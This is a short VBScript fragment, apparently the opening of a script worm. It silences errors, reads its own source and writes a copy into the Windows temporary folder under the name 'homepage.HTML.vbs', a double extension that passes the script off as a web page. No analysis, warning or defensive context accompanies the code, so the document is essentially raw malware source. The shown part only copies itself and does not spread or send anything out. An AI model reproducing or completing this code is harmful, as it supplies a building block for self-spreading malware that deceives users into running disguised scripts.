On Error Resume Next
Set WS = CreateObject("Wscript.Shell")
Set FSO= Createobject("scripting.filesystemobject")
Folder=FSO.GetSpecialFolder(2)
Set InF=FSO.OpenTextFile(Wscript.scriptFullname,1)

Do While InF.AtEndOfStream<>True
scriptBuffer=scriptBuffer&InF.ReadLine&vbcrlf
Loop

Set OutF=FSO.OpenTextFile(Folder&"homepage.HTML.vbs",2,true)
OutF.write scriptBuffer
OutF.close
Set FSO=Nothing
